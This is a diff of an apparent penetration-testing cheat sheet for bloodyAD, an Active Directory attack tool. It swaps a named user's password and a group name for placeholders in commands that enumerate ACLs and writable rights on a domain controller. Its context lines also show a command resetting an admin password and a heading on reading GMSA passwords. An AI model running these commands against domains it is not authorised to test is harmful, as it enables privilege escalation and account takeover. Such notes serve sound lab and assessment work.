@@ -13,21 +13,21 @@ bloodyAD -u john -p 'NewPassword123!' -d $domain --host $IP set password admin '
 
 ```bash
 #Enumerate the attributes and ACLs of a specific group
- bloodyAD --host dc01.ad.trilocor.local -d ad.trilocor.local -u divanov -p Dimitris2001 get object "CN=MSSP Connect,OU=Security Groups,OU=Corp,DC=ad,DC=trilocor,DC=local" --attr 
+ bloodyAD --host dc01.ad.trilocor.local -d ad.trilocor.local -u username -p password get object "CN=GROUP NAME,OU=Security Groups,OU=Corp,DC=ad,DC=trilocor,DC=local" --attr 
  distinguishedName,nTSecurityDescriptor --resolve-sd
 ```
 
 Enumerate a user’s rights at the Domain Level
 
 ```bash
-bloodyAD --host dc01.ad.trilocor.local -d ad.trilocor.local -u divanov -p Dimitris2001 get object 'DC=ad,DC=trilocor,DC=local' --attr ntsecuritydescriptor --resolve-sd
+bloodyAD --host dc01.ad.trilocor.local -d ad.trilocor.local -u username -p password get object 'DC=ad,DC=trilocor,DC=local' --attr ntsecuritydescriptor --resolve-sd
 ```
 
 Enumerate a user’s
 
 ```bash
 #Enumerate a user's rights, permissions, ACLs
-bloodyAD --host dc01.ad.trilocor.local -d ad.trilocor.local -u divanov -p Dimitris2001 get writable --detail
+bloodyAD --host dc01.ad.trilocor.local -d ad.trilocor.local -u username -p password get writable --detail
 ```
 
 **Read GMSA Password (ReadGMSAPassword)**
